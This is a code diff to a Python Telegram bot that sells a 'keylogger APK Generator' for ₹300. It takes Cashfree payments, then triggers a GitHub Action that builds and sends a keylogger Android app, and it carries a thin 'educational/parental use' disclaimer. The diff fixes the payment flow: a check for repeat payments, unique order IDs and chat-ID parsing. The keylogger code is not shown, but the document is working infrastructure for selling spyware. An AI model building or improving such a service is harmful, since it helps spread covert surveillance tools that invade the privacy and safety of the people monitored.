@@ -1,5 +1,6 @@
 import os
 import json
+import time
 import logging
 import hmac
 import hashlib
@@ -68,30 +69,33 @@ def handle_message():
 
     if command == "/start":
         welcome = (
-            "👋 Welcome to the keylogger APK Generator Bot!\n\n"
+            "\U0001F44B Welcome to the keylogger APK Generator Bot!\n\n"
             "Developed by <a href=\"https://www.instagram.com/cyber.naveen.info\">cyber.naveen.info</a>\n\n"
-            "🛡 Disclaimer: This is for educational/parental use only.\n\n"
+            "\U0001F6E1 Disclaimer: This is for educational/parental use only.\n\n"
             "Use /pay to proceed or /request_apk after payment."
         )
         send_message(chat_id, welcome, "HTML")
 
     elif command == "/pay":
-        payment_link = create_cashfree_order(chat_id)
-        if payment_link:
-            send_message(chat_id, f"💸 Click here to pay ₹300:\n{payment_link}")
+        if is_user_paid(chat_id):
+            send_message(chat_id, "✅ You’ve already paid. Use /request_apk to get your APK.")
         else:
-            send_message(chat_id, "❌ Payment link could not be created. Try again later.")
+            payment_link = create_cashfree_order(chat_id)
+            if payment_link:
+                send_message(chat_id, f"\U0001F4B8 Click here to pay ₹300:\n{payment_link}")
+            else:
+                send_message(chat_id, "\u274C Payment link could not be created. Try again later.")
 
     elif command == "/request_apk":
         if not is_user_paid(chat_id):
-            send_message(chat_id, "🚫 Please pay ₹300 to access this feature. Use /pay to begin.")
+            send_message(chat_id, "\U0001F6AB Please pay ₹300 to access this feature. Use /pay to begin.")
             return "OK"
         response = trigger_github_action(chat_id)
         if response and response.status_code == 204:
             send_message(chat_id, "✅ Your APK is being generated. You'll receive it shortly!")
         else:
             app.logger.error(f"GitHub Trigger Failed: {response.text if response else 'No response'}")
-            send_message(chat_id, "❌ Error generating APK. Try again later.")
+            send_message(chat_id, "\u274C Error generating APK. Try again later.")
 
     else:
         send_message(chat_id, "❓ Unknown command. Use /start for help.")
@@ -137,7 +141,8 @@ def create_cashfree_order(chat_id):
         "x-api-version": "2022-09-01",
         "Content-Type": "application/json"
     }
-    order_id = f"kidslogger_{chat_id}"
+    timestamp = int(time.time())
+    order_id = f"kidslogger_{chat_id}_{timestamp}"
     payload = {
         "order_id": order_id,
         "order_amount": 300.0,
@@ -148,7 +153,7 @@ def create_cashfree_order(chat_id):
             "customer_phone": "9999999999"
         },
         "order_meta": {
-            "notify_url": "https://tellogs.koyeb.app/cashfree-webhook",  # webhook endpoint
+            "notify_url": "https://tellogs.koyeb.app/cashfree-webhook",
             "return_url": "https://tellogs.koyeb.app/paid-success"
         }
     }
@@ -183,7 +188,7 @@ def cashfree_webhook():
         if data.get("event") == "PAYMENT_SUCCESS":
             order_data = data.get("data", {}).get("order", {})
             order_id = order_data.get("order_id", "")
-            chat_id = order_id.replace("kidslogger_", "")
+            chat_id = order_id.replace("kidslogger_", "").split("_")[0]
             if chat_id:
                 save_paid_user(chat_id)
                 send_message(chat_id, "✅ Payment confirmed! Now use /request_apk to get your APK.")
